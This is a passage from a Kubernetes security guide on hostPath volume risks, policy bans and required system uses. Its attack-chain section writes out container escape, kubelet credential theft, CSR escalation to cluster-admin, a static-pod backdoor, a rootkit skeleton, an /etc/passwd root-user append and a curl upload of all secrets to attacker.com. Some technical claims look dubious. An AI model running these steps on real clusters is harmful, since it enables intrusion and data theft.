- [ ] CI/CD pipelines → ❌ **DENY** (use Kaniko instead)

### Question 4: What namespace?
- [ ] `kube-system` → ⚠️ Review carefully
- [ ] System namespaces → ⚠️ Review carefully
- [ ] Application namespaces → ❌ **DENY**

### Question 5: Can you use an alternative?
- [ ] Yes, ConfigMap/Secret → ✅ Use that instead
- [ ] Yes, PVC → ✅ Use that instead
- [ ] Yes, emptyDir → ✅ Use that instead
- [ ] No alternative → Proceed with extreme caution

---

## Summary: hostPath Security Impact

### Critical Understanding

hostPath **fundamentally breaks** the container isolation model by creating a **bind mount** from the host filesystem into the container. This means:

1. **Mount namespace** → Bypassed (can access host files)
2. **UID/GID mapping** → Not isolated (container root = host root)
3. **Filesystem permissions** → Apply as-is (no additional protection)
4. **SELinux/AppArmor** → Context inherited (may bypass policies)

### The Security Spectrum

```
Least Dangerous ←──────────────────────────→ Most Dangerous

/sys (RO)  →  /proc (RO)  →  /var/log (RO)  →  /var/lib/kubelet  →  /etc  →  /var/run/docker.sock  →  / (root)
   ↓              ↓              ↓                    ↓              ↓            ↓                      ↓
Hardware info  Process info  Logs only      Secrets exposed   Credentials   Container escape    Full control
(acceptable)  (acceptable)  (acceptable)   (dangerous)      (critical)     (critical)         (catastrophic)
```

### Default Security Posture

**Secure by default**:
```yaml
# Block all hostPath in application namespaces
pod-security.kubernetes.io/enforce: restricted

# Allow only in system namespaces with specific paths
pod-security.kubernetes.io/enforce: baseline
# + OPA policy for path whitelisting
```

**Never compromise on**:
- ❌ Never allow `/var/run/docker.sock` in user workloads
- ❌ Never allow `/etc` mounting
- ❌ Never allow `/` (root) mounting
- ❌ Never allow write access to critical paths

## 5. How hostPath Can Lead to Node Compromise, Root Escalation, and Breaking Node Components

Let me walk you through **real attack chains** I've investigated in production environments.

### Attack Chain 1: From Application Pod to Cluster-Admin (15 minutes)

**Initial Access**: Developer deploys compromised image to application namespace

**Step 1: Discover hostPath misconfiguration** (2 minutes)
```bash
# Attacker inside compromised Pod
kubectl auth can-i --list
# pods/exec: yes
# pods/create: yes

# Try creating Pod with hostPath (should be blocked, but...)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: shell
    image: alpine
    command: ['sh', '-c', 'sleep 3600']
    volumeMounts:
    - name: root
      mountPath: /host
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
EOF

# If successful (PSP/PSA not configured), continue...
```

**Step 2: Access kubelet credentials** (3 minutes)
```bash
kubectl exec -it escape-pod -- sh

# Find kubelet kubeconfig
cat /host/etc/kubernetes/kubelet.conf
# apiVersion: v1
# kind: Config
# clusters:
# - cluster:
#     certificate-authority-data: LS0tLS1CRUdJTi...
#     server: https://10.0.0.1:6443
#   name: kubernetes
# contexts:
# - context:
#     cluster: kubernetes
#     user: system:node:worker-1
#   name: system:node:worker-1@kubernetes
# current-context: system:node:worker-1@kubernetes
# users:
# - name: system:node:worker-1
#   user:
#     client-certificate-data: LS0tLS1CRUdJTi...
#     client-key-data: LS0tLS1CRUdJTi...

# Save to local machine
kubectl cp escape-pod:/host/etc/kubernetes/kubelet.conf ./kubelet.conf
```

**Step 3: Escalate privileges via node identity** (5 minutes)
```bash
# Test kubelet access
kubectl --kubeconfig=./kubelet.conf get nodes
# NAME       STATUS   ROLES    AGE   VERSION
# worker-1   Ready    <none>   30d   v1.28.0

# In older/misconfigured clusters, nodes have elevated permissions
kubectl --kubeconfig=./kubelet.conf get secrets -A
# (If this works, game over - full cluster access)

# If node permissions are restricted, try certificate manipulation
# Node certificates can often create new certificates via CSR API
cat <<EOF | kubectl --kubeconfig=./kubelet.conf apply -f -
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: hacker-admin
spec:
  request: $(cat admin-csr.pem | base64 | tr -d '\n')
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
  groups:
  - system:masters  # Cluster admin group!
EOF

kubectl --kubeconfig=./kubelet.conf certificate approve hacker-admin
```

**Step 4: Extract cluster-admin cert** (2 minutes)
```bash
# Get signed certificate
kubectl --kubeconfig=./kubelet.conf get csr hacker-admin -o jsonpath='{.status.certificate}' | base64 -d > admin.crt

# Create admin kubeconfig
kubectl config set-cluster kubernetes \
  --server=https://10.0.0.1:6443 \
  --certificate-authority=ca.crt \
  --embed-certs=true \
  --kubeconfig=admin.conf

kubectl config set-credentials cluster-admin \
  --client-certificate=admin.crt \
  --client-key=admin.key \
  --embed-certs=true \
  --kubeconfig=admin.conf

kubectl config set-context default \
  --cluster=kubernetes \
  --user=cluster-admin \
  --kubeconfig=admin.conf

kubectl config use-context default --kubeconfig=admin.conf
```

**Step 5: Full cluster compromise** (3 minutes)
```bash
# Now you're cluster-admin
kubectl --kubeconfig=admin.conf get secrets -A
kubectl --kubeconfig=admin.conf get nodes
kubectl --kubeconfig=admin.conf create clusterrolebinding hacker-admin \
  --clusterrole=cluster-admin --serviceaccount=default:default

# Install persistence (DaemonSet backdoor on all nodes)
kubectl --kubeconfig=admin.conf apply -f backdoor-daemonset.yaml

# Exfiltrate all secrets
kubectl --kubeconfig=admin.conf get secrets -A -o json > all-secrets.json
curl -X POST https://attacker.com/exfil -d @all-secrets.json
```

**Total time**: 15 minutes from initial Pod access to full cluster admin.

---

### Attack Chain 2: Breaking Node Components via hostPath

**Scenario**: Attacker gains access to Pod with `/var/lib/kubelet` mounted

#### Attack 2A: Corrupt kubelet state

```bash
# Inside malicious Pod
kubectl exec -it malicious-pod -- sh

# Find kubelet's pod state
ls /host/var/lib/kubelet/pods/
# abc-123-def  ← Pod UIDs
# ghi-456-jkl
# mno-789-pqr

# Delete a critical Pod's state
rm -rf /host/var/lib/kubelet/pods/abc-123-def/

# Kubelet tries to reconcile, fails, enters crash loop
# Node becomes NotReady
# All Pods on node evicted
```

**Impact**:
- Node goes NotReady
- Workloads rescheduled (service disruption)
- If many nodes affected → cluster-wide outage

#### Attack 2B: Inject malicious plugin

```bash
# Kubelet loads plugins from /var/lib/kubelet/plugins_registry/
ls /host/var/lib/kubelet/plugins_registry/
# csi-driver.sock
# device-plugin.sock

# Create malicious device plugin that registers fake GPUs
cat <<'EOF' > /tmp/fake-gpu-plugin.go
package main

import (
    "net"
    pluginapi "k8s.io/kubelet/pkg/apis/deviceplugin/v1beta1"
    "google.golang.org/grpc"
)

func main() {
    // Register fake GPU device plugin
    sock := "/var/lib/kubelet/device-plugins/fake-gpu.sock"
    // ... plugin code that reports 1000 fake GPUs ...
}
EOF

# Compile and run
go build -o /host/var/lib/kubelet/device-plugins/fake-gpu fake-gpu-plugin.go
/host/var/lib/kubelet/device-plugins/fake-gpu &

# Kubelet now thinks node has 1000 GPUs
# Scheduler places GPU workloads here
# All fail (no actual GPUs)
```

#### Attack 2C: Modify Pod manifests (Static Pods)

```bash
# Static Pod manifests in /etc/kubernetes/manifests/
ls /host/etc/kubernetes/manifests/
# kube-apiserver.yaml
# kube-controller-manager.yaml
# kube-scheduler.yaml
# etcd.yaml

# Inject malicious sidecar into kube-apiserver
cat <<EOF >> /host/etc/kubernetes/manifests/kube-apiserver.yaml
  - name: backdoor
    image: attacker/backdoor:latest
    volumeMounts:
    - name: k8s-certs
      mountPath: /etc/kubernetes/pki
      readOnly: true
EOF

# Kubelet detects change, restarts kube-apiserver Pod
# New Pod includes backdoor container with access to all K8s certs
```

---

### Attack Chain 3: Privilege Escalation via Capabilities

**Scenario**: Pod has hostPath + `CAP_DAC_OVERRIDE` capability

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privileged-logger
spec:
  containers:
  - name: logger
    image: fluentd
    securityContext:
      capabilities:
        add:
          - DAC_OVERRIDE  # Bypass file permissions!
    volumeMounts:
    - name: logs
      mountPath: /var/log
  volumes:
  - name: logs
    hostPath:
      path: /var/log
```

**What `CAP_DAC_OVERRIDE` does**: Bypass read/write/execute permission checks

**Attack**:
```bash
kubectl exec -it privileged-logger -- sh

# Normally, /var/log/secure is readable only by root
ls -la /var/log/secure
# -rw------- 1 root root 12345 Nov 19 10:00 /var/log/secure

# But with CAP_DAC_OVERRIDE...
cat /var/log/secure
# Nov 19 09:00:01 node sshd[1234]: Accepted publickey for admin from 192.168.1.100
# SUCCESS! Read protected file

# Even worse, can WRITE to protected files
echo "attacker:x:0:0::/root:/bin/bash" >> /var/log/../../etc/passwd
# Path traversal to /etc/passwd!
```

**Common dangerous capability combinations**:
- `CAP_DAC_OVERRIDE` + hostPath = Bypass all file permissions
- `CAP_SYS_ADMIN` + hostPath = Can mount filesystems, load kernel modules
- `CAP_SYS_PTRACE` + hostPath `/proc` = Can inject code into any process
- `CAP_NET_ADMIN` + hostPath `/var/run` = Can manipulate iptables, routing

---

### Attack Chain 4: Kernel Exploits via hostPath

**Scenario**: Mount `/dev` and `/sys` with write access

```yaml
volumes:
- name: dev
  hostPath:
    path: /dev
- name: sys
  hostPath:
    path: /sys
volumeMounts:
- name: dev
  mountPath: /dev
- name: sys
  mountPath: /sys
```

**Attack: Load malicious kernel module**:
```bash
# Inside container with /dev and /sys access
kubectl exec -it kernel-exploit -- sh

# Write malicious kernel module
cat <<'EOF' > /tmp/rootkit.c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk(KERN_INFO "Rootkit loaded\n");
    // Backdoor code here
    return 0;
}

void cleanup_module(void) {
    printk(KERN_INFO "Rootkit unloaded\n");
}

MODULE_LICENSE("GPL");
EOF

# Compile kernel module
gcc -c -o /tmp/rootkit.o /tmp/rootkit.c

# Load into kernel (if CAP_SYS_MODULE or privileged)
insmod /tmp/rootkit.o

# Now rootkit is in kernel space, can:
# - Hide processes
# - Hide network connections
# - Intercept syscalls
# - Grant root to any process
```

**Why this works**: Linux kernel modules run with full kernel privileges. Once loaded, game over.

---

## 6. How Container Processes Can Modify Host Files

### The Mechanics

When you mount a hostPath, the container process gets **direct access** to the host's inode structure:

```
Container Process (PID 12345)
     ↓
Opens file: /app/data/important.txt
     ↓
Kernel translates to: /host/mnt/data/important.txt
     ↓
Inode: 987654 (on host filesystem)
     ↓
Changes written directly to host disk
     ↓
Immediately visible to ALL processes (host + other containers)
```

### Shared Inode Example

**Setup**:
```yaml
# Pod 1
volumes:
- name: shared
  hostPath:
    path: /shared-data
    type: DirectoryOrCreate

# Pod 2 (on same node)
volumes:
- name: shared
  hostPath:
    path: /shared-data
    type: Directory
```

**What happens**:
```bash
# In Pod 1
echo "Hello from Pod 1" > /shared-data/file.txt

# In Pod 2 (same node)
cat /shared-data/file.txt
# Hello from Pod 1  ← Immediate visibility!

# On host
cat /shared-data/file.txt
# Hello from Pod 1  ← Same file!

# Check inode
stat /shared-data/file.txt
#   File: /shared-data/file.txt
#   Size: 18        	Blocks: 8          IO Block: 4096   regular file
# Device: 801h/2049d	Inode: 1234567     Links: 1

# In Pod 1
stat /shared-data/file.txt
#   Inode: 1234567  ← SAME INODE!
```

### Race Condition Example

**Scenario**: Two Pods writing to same hostPath file

```bash
# Pod 1
for i in {1..1000}; do
  echo "Pod1-$i" >> /shared/counter.txt
done

# Pod 2 (simultaneously)
for i in {1..1000}; do
  echo "Pod2-$i" >> /shared/counter.txt
done

# Result: Corrupted file
cat /shared/counter.txt
# Pod1-1
# Pod2-1
# Pod1-2Pod2-2  ← CORRUPTION! Both wrote simultaneously
# Pod1-3
# Pod2Pod1-43  ← More corruption
```

**Why this happens**: No coordination between Pods. Both append simultaneously, causing interleaved writes.

### File Locking (Doesn't Always Help)

**Attempted fix**:
```bash
# Pod 1
flock /shared/counter.txt -c 'echo "Pod1" >> /shared/counter.txt'

# Pod 2
flock /shared/counter.txt -c 'echo "Pod2" >> /shared/counter.txt'
```

**Problem**: `flock()` only works within same mount namespace in some configurations. Across Pods (different mount namespaces), may not be honored.

---

### Permission Preservation Example

**The confusion**:
```yaml
# Run container as UID 1000
securityContext:
  runAsUser: 1000
  fsGroup: 1000

volumes:
- name: data
  hostPath:
    path: /data
```

**What developers expect**:
```bash
# Inside container
touch /data/file.txt
ls -la /data/file.txt
# -rw-r--r-- 1 1000 1000 0 Nov 19 10:00 file.txt  ← Owned by UID 1000
```

**What actually happens on host**:
```bash
# On host
ls -la /data/file.txt
# -rw-r--r-- 1 1000 1000 0 Nov 19 10:00 file.txt  ← SAME UID 1000

# If UID 1000 on host is 'alice':
ls -la /data/file.txt
# -rw-r--r-- 1 alice alice 0 Nov 19 10:00 file.txt

# Now alice (on host) can modify files created by container!
```

**Security implication**: Host users with matching UIDs can access container-created files.

---

### Modifying System Files (The Danger)

**Scenario**: Container with `/etc` mounted modifies system config

```yaml
volumes:
- name: etc
  hostPath:
    path: /etc
```

```bash
kubectl exec -it modify-etc -- sh

# Modify SSH config to allow password auth
sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /host-etc/ssh/sshd_config

# Restart SSH (if container has access to systemd socket)
systemctl restart sshd

# Or signal the process
kill -HUP $(pidof sshd)

# Now SSH accepts passwords (security downgrade)
```

**Real incident**: Contractor Pod had `/etc` mounted for "debugging". They modified `/etc/resolv.conf`, breaking DNS for entire node. Took 2 hours to diagnose because DNS worked intermittently (depending on Pod restarts).

---

## 7. Why hostPath Is Often Banned in Production Clusters

### Enterprise Security Requirements

Most enterprises have security frameworks that **explicitly prohibit** hostPath:

#### CIS Kubernetes Benchmark

**Control 5.2.4**: "Minimize the admission of containers wishing to share the host process ID namespace"

**Control 5.2.5**: "Minimize the admission of containers wishing to share the host IPC namespace"

**Control 5.2.6**: "Minimize the admission of containers wishing to share the host network namespace"

**Control 5.2.7**: "Minimize the admission of privileged containers"

**Control 5.2.8**: **"Minimize the admission of containers with host path volumes"**

**Rationale from CIS**:
> "HostPath volumes present many security risks. It is best to avoid their use where possible. If HostPath volumes are used, they should be limited to required paths only and mounted as read-only where possible."

---

#### PCI-DSS Compliance

**Requirement 2.2.5**: "Configure security policies to prevent misuse of system privileges"

**How hostPath violates this**:
- Allows containers to access credit card data on host filesystem
- Breaks isolation required for PCI scoping
- Can't prove data segregation in audit

**Result**: PCI auditors **fail** clusters that allow unrestricted hostPath.

---

#### HIPAA Compliance (Healthcare)

**164.312(a)(1)**: "Access Control - Implement technical policies and procedures for electronic information systems that maintain electronic protected health information to allow access only to those persons or software programs that have been granted access rights"

**How hostPath violates this**:
- PHI (Protected Health Information) on host accessible to containers
- No audit trail of which container accessed which files
- Violates "minimum necessary" access principle

---

#### SOC 2 Type II Compliance

**CC6.1**: "The entity implements logical access security software"

**CC6.6**: "The entity implements logical access security measures to protect against threats from sources outside its system boundaries"

**How hostPath fails audit**:
- Logical access controls (namespace isolation) bypassed
- External threats (compromised container) can access internal systems
- Cannot demonstrate "defense in depth"

---

### Multi-Tenancy Violations

**The Promise of Kubernetes Multi-Tenancy**:
```
┌─────────────────────────────────────────┐
│         Shared Cluster                  │
│  ┌──────────────┐  ┌──────────────┐    │
│  │  Tenant A    │  │  Tenant B    │    │
│  │  Namespace   │  │  Namespace   │    │
│  │  (isolated)  │  │  (isolated)  │    │
│  └──────────────┘  └──────────────┘    │
└─────────────────────────────────────────┘
```

**The Reality with hostPath**:
```
┌─────────────────────────────────────────┐
│         Shared Cluster                  │
│  ┌──────────────┐  ┌──────────────┐    │
│  │  Tenant A    │  │  Tenant B    │    │
│  │  ┌─────────┐ │  │  ┌─────────┐ │    │
│  │  │ Pod     │ │  │  │ Pod     │ │    │
│  │  │hostPath─┼─┼──┼──┤hostPath │ │    │
│  │  └─────────┘ │  │  └─────────┘ │    │
│  └──────┬───────┘  └───────┬──────┘    │
│         │                   │           │
│         └────────┬──────────┘           │
│                  ↓                      │
│        /shared-host-directory          │
│    (BOTH TENANTS CAN ACCESS!)          │
└─────────────────────────────────────────┘
```

**Attack**: Tenant A mounts `/tmp/tenant-data` → Tenant B (if on same node) mounts same path → Data leakage!

---

### Common Ban Scenarios

#### Scenario 1: Financial Services

```yaml
# Policy enforced by admission controller
apiVersion: v1
kind: ConfigMap
metadata:
  name: security-policy
  namespace: kube-system
data:
  policy: |
    # Deny ALL hostPath volumes except in kube-system namespace
    deny[msg] {
      input.request.kind.kind == "Pod"
      input.request.namespace != "kube-system"
      volume := input.request.object.spec.volumes[_]
      volume.hostPath
      msg := sprintf("hostPath volumes forbidden in namespace %v", [input.request.namespace])
    }
```

**Enforcement tools**:
- OPA Gatekeeper
- Kyverno
- Pod Security Admission
- Custom admission webhooks

---

#### Scenario 2: Government / Defense

**Requirement**: "Air-gapped containers" (no access to host systems)

```yaml
# Pod Security Standard: Restricted
# Blocks: hostPath, hostNetwork, hostPID, hostIPC, privileged, capabilities
pod-security.kubernetes.io/enforce: restricted
pod-security.kubernetes.io/enforce-version: latest
```

**Exemptions**: Only for specific system namespaces after security review.

---

#### Scenario 3: SaaS Platforms

**Business requirement**: "Customers cannot access other customers' data"

**Technical requirement**: "Strict tenant isolation"

```yaml
# Namespace-level network policies
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress

# + Pod Security Standards
# + No hostPath allowed
# + Runtime security (Falco) monitoring
```

---

## 8. When hostPath Is Absolutely Required in Enterprise Clusters

Despite all the risks, certain system components **cannot function** without hostPath. Let's examine each category:

### A. CNI (Container Network Interface) Plugins

**Why CNI needs hostPath**:
1. **Install binaries**: Must write to `/opt/cni/bin/`
2. **Configure network**: Must write to `/etc/cni/net.d/`
3. **Access netns**: Must read `/var/run/netns/`
4. **Manipulate iptables**: Needs access to `/run/xtables.lock`

**Example: Calico**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: calico-node
  namespace: kube-system
spec:
  template:
    spec:
      hostNetwork: true  # Required
      tolerations:
      - operator: Exists
      containers:
      - name: calico-node
        securityContext:
          privileged: true  # Required for network operations
        volumeMounts:
        - name: lib-modules
          mountPath: /lib/modules
          readOnly: true
        - name: var-run-calico
          mountPath: /var/run/calico
        - name: var-lib-calico
          mountPath: /var/lib/calico
        - name: xtables-lock
          mountPath: /run/xtables.lock
        - name: cni-bin-dir
          mountPath: /host/opt/cni/bin  # MUST install binaries here
        - name: cni-net-dir
          mountPath: /host/etc/cni/net.d  # MUST write config here
      volumes:
      - name: lib-modules
        hostPath:
          path: /lib/modules
      - name: var-run-calico
        hostPath:
          path: /var/run/calico
      - name: var-lib-calico
        hostPath:
          path: /var/lib/calico
      - name: xtables-lock
        hostPath:
          path: /run/xtables.lock
          type: FileOrCreate
      - name: cni-bin-dir
        hostPath:
          path: /opt/cni/bin
      - name: cni-net-dir
        hostPath:
          path: /etc/cni/net.d
```

**There is NO alternative** to hostPath for CNI because:
- Kubelet expects CNI binaries at `/opt/cni/bin/`
- CNI plugins must manipulate host network stack
- Each node needs its own independent network configuration

---

### B. CSI (Container Storage Interface) Drivers

**Why CSI needs hostPath**:
1. **Register with kubelet**: Write socket to `/var/lib/kubelet/plugins_registry/`
2. **Mount volumes**: Access `/var/lib/kubelet/pods/*/volumes/`
3. **Block devices**: Access `/dev/` for raw disk operations

**Example: Rook/Ceph CSI**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: csi-rbdplugin
  namespace: rook-ceph
spec:
  template:
    spec:
      containers:
      - name: driver-registrar
        volumeMounts:
        - name: plugin-dir
          mountPath: /csi
        - name: registration-dir
          mountPath: /registration
      - name: csi-rbdplugin
        securityContext:
          privileged: true
        volumeMounts:
        - name: plugin-dir
          mountPath: /csi
        - name: pods-mount-dir
          mountPath: /var/lib/kubelet/pods
          mountPropagation: Bidirectional
        - name: plugin-mount-dir
          mountPath: /var/lib/kubelet/plugins
          mountPropagation: Bidirectional
        - name: host-dev
          mountPath: /dev
        - name: host-sys
          mountPath: /sys
      volumes:
      - name: plugin-dir
        hostPath:
          path: /var/lib/kubelet/plugins/rbd.csi.ceph.com
          type: DirectoryOrCreate
      - name: registration-dir
        hostPath:
          path: /var/lib/kubelet/plugins_registry/
          type: Directory
      - name: pods-mount-dir
        hostPath:
          path: /var/lib/kubelet/pods
          type: Directory
      - name: plugin-mount-dir
        hostPath:
          path: /var/lib/kubelet/plugins
          type: Directory
      - name: host-dev
        hostPath:
          path: /dev
      - name: host-sys
        hostPath:
          path: /sys
```

**There is NO alternative** because:
- Kubelet CSI plugin discovery requires specific socket paths
- Volume mounting requires access to kubelet's internal directories
- Block storage requires direct device access

---

### C. Logging Agents

**Why logging agents need hostPath**:
1. **Container logs**: Kubelet writes to `/var/log/pods/`
2. **System logs**: OS writes to `/var/log/messages`, `/var/log/syslog`
3. **Audit logs**: API server writes to `/var/log/kubernetes/audit.log`

**Example: Fluent Bit**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: fluent-bit
  namespace: logging
spec:
  template:
    spec:
      serviceAccountName: fluent-bit
      containers:
      - name: fluent-bit
        image: fluent/fluent-bit:latest
        volumeMounts:
        - name: varlog
          mountPath: /var/log
          readOnly: true  # ✅ READ-ONLY!
        - name: varlibdockercontainers
          mountPath: /var/lib/docker/containers
          readOnly: true  # ✅ READ-ONLY!
        - name: fluent-bit-config
          mountPath: /fluent-bit/etc/
      volumes:
      - name: varlog
        hostPath:
          path: /var/log
      - name: varlibdockercontainers
        hostPath:
          path: /var/lib/docker/containers
      - name: fluent-bit-config
        configMap:
          name: fluent-bit-config
```

**Alternatives exist but have trade-offs**:
- **Sidecar pattern**: Works but adds resource overhead to every Pod
- **Logging driver**: Requires modifying container runtime config
- **hostPath remains the most efficient** for node-level log collection

---

### D. Monitoring Agents (Prometheus node-exporter)

**Why node-exporter needs hostPath**:
1. **CPU metrics**: Read `/proc/cpuinfo`, `/proc/stat`
2. **Memory metrics**: Read `/proc/meminfo`
3. **Disk metrics**: Read `/proc/diskstats`, `/sys/block/`
4. **Network metrics**: Read `/proc/net/dev`, `/sys/class/net/`

**Example: node-exporter**
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-exporter
  namespace: monitoring
spec:
  template:
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: node-exporter
        image: quay.io/prometheus/node-exporter:latest
        args:
        - --path.procfs=/host/proc
        - --path.sysfs=/host/sys
        - --path.rootfs=/host/root
        - --collector.filesystem.mount-points-exclude=^/(dev|proc|sys|var/lib/docker/.+)($|/)
        volumeMounts:
        - name: proc
          mountPath: /host/proc
          readOnly: true
          mountPropagation: HostToContainer
        - name: sys
          mountPath: /host/sys
          readOnly: true
          mountPropagation: HostToContainer
        - name: root
          mountPath: /host/root
          readOnly: true
          mountPropagation: HostToContainer
      volumes:
      - name: proc
        hostPath:
          path: /proc
      - name: sys
        hostPath:
          path: /sys
      - name: root
        hostPath:
          path: /
```

**There is NO alternative** because:
- Metrics MUST come from host kernel (`/proc`, `/sys`)
- Can't be collected from inside container's namespace
- Kubelet metrics API doesn't provide all node-level details

---

### Summary: The "Blessed Four" Use Cases

In enterprise environments, hostPath is **only permitted** for:

| Use Case | Namespace | Read-Only | Privileged | Justification |
|----------|-----------|-----------|------------|---------------|
| **CNI Plugins** | `kube-system` | ❌ No | ✅ Yes | Must configure host network |
| **CSI Drivers** | `rook-ceph`, `longhorn-system` | ❌ No | ✅ Yes | Must access block devices |
| **Logging Agents** | `logging`, `kube-system` | ✅ **Yes** | ❌ No | Only reading logs |
| **Monitoring** | `monitoring` | ✅ **Yes** | ❌ No | Only reading metrics |

**Everything else**: Use PVC, ConfigMap, Secret, or object storage.

---
